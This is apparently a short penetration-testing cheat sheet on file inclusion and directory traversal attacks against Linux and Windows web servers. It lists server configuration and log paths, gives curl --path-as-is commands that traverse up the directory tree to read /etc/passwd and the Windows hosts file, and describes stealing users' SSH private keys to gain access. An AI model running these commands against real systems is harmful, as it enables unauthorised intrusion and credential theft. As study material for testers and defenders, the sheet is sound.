
# Common Attacks towards Web Applications

## File Inclusion

Linux Web Servers

* PATH `/var/www/html/login.html.`
* URLs `https://example.com/login.html`
* POIs `https://example.com/cms/login.php?page=en.html`
  * subfolder cms
  * PHP language
  * file inclusion

Windows Web Server

* [LFI](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e)
* [IIS Log Management](https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage)
* ISS Conf `\inetpub\wwwroot\web.config`
* ISS Logs `\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log`
* Apache Conf `/xampp/apache/conf/httpd.conf`
* Apache Logs `/xampp/apache/logs/access.log`
* Apache Logs `/xampp/apache/logs/error.log`
* Sensitive information: user, passwords

## Directory Traversal

* Test if path traversal is possible
* Windows `C:\Windows\System32\drivers\etc\hosts`
* Linux `/etc/passwd`

Curl

* --path-as-is for ../
* Windows LFI without C:

```bash
curl --path-as-is http://target-URL/public/../../../../../../../../WINDOWS/System32/drivers/etc/hosts
curl --path-as-is http://target-URL/public/../../../../../../../../etc/passwd

```

On Windows system, try to read `C:/WINDOWS/System32/drivers/etc/hosts` file first to test for path traversal. Next try to read files of the identified web server and it's configuration file or logs. Try to find sensitive information like username or passwords.

In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of `/etc/passwd`, check for private keys in their home directory `/home/user/.ssh/id_rsa`, and use them to access the system via SSH.
